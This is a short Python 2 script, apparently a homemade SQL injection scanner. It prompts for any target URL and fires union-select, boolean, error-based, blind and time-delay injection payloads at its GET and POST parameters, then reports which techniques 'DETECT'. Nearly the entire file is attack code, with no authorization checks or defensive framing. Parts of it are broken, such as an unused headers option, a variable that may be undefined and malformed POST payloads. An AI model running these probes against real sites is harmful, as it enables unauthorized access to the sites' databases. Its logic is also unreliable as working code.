import httplib
import urllib, urllib2
import sys
import time


post = []
gettest=1
while 1:
    ch = input("[1]URL\n[2]POST parameters\n[3]Headers\n[4]Test\n")

    if(ch==1):
        url = input("target url : ")
        getp = url.find('?')
        while getp==-1:
            print 'There are no GET parameters. GET test will be skipped. Do you want to proceed anyway? [Y/N]'
            ch = input()
            if(ch=='Y'):
                gettest=0
                break
            elif(ch=='N'):
                exit()
            else:
                    print 'wrong input'
    elif(ch==2):
        post=input("POST Parameter : ")
    elif(ch==4):
        break
if gettest==1:
    get = ''
    if(getp==-1):
        dest=url
    else:
        dest = url[0:getp]
        get = url[getp:]
    data1 = ''
    payload = ' union select 1'
    for i in range(2,10):
        getlist = get.split('=')
        payload += "," + str(i)
        req = urllib2.Request(dest+getlist[0]+'='+str(-3789)+urllib.quote(payload+" #"))
        response = urllib2.urlopen(req)
        data2 = response.read()
        if data1!=data2 and i!=2:
            sys.stdout.write('Union SQL injection #' + str(i) + ' DETECT')
            break
        data1=data2
    
    payload = ' and substring(version(),1,1)='
    for i in range(2,10):
        req = urllib2.Request(dest+get+urllib.quote(payload+ str(i)))
        response = urllib2.urlopen(req)
        data2 = response.read()
        if data1!=data2 and i!=2:
            sys.stdout.write('\nBoolean based SQL injection DETECT')
            break
        data1=data2
    
    req = urllib2.Request(dest+get+urllib.quote(" having 1=1--"))
    response = urllib2.urlopen(req)
    data1 = response.read()
    req = urllib2.Request(dest+get+urllib.quote("' having 1=1--"))
    response = urllib2.urlopen(req)
    data2 = response.read()
    if data1!=data2:
        sys.stdout.write('\nError based SQL injection DETECT')
    
    req = urllib2.Request(dest+get+urllib.quote(' and 1=1'))
    response = urllib2.urlopen(req)
    data1 = response.read()
    req = urllib2.Request(dest+get+urllib.quote(' and 1=0'))
    response = urllib2.urlopen(req)
    data2 = response.read()
    if data1!=data2:
        sys.stdout.write('\nBlind SQL injection DETECT')
    

    t1=time.time()
    req = urllib2.Request(dest+get)
    response = urllib2.urlopen(req)
    data1 = response.read()
    t2=time.time()
    interval1 = t2-t1
    t1=time.time()
    req = urllib2.Request(dest+get+urllib.quote(";waitfor delay '00:00:01'"))
    response = urllib2.urlopen(req)
    data2 = response.read()
    t2=time.time()
    interval2 = t2-t1

    if interval2-interval1>0.9:
        sys.stdout.write('\nTime based SQL injection DETECT')


payload = post + '= and 1=0'
req = urllib2.Request(url,payload)
response = urllib2.urlopen(req)
data1 = response.read()
payload = post + "= and 1=1"
req = urllib2.Request(url,payload)
response = urllib2.urlopen(req)
data2 = response.read()
if data1!=data2:
    sys.stdout.write('\nBoolean based SQL injection DETECT')

payload = post + "=, sleep(5)"
t1=time.time()
req = urllib2.Request(url,payload)
response = urllib2.urlopen(req)
data1 = response.read()
t2=time.time()

if t2-t1>4.5:
    sys.stdout.write('\nTime based SQL injection DETECT')
        

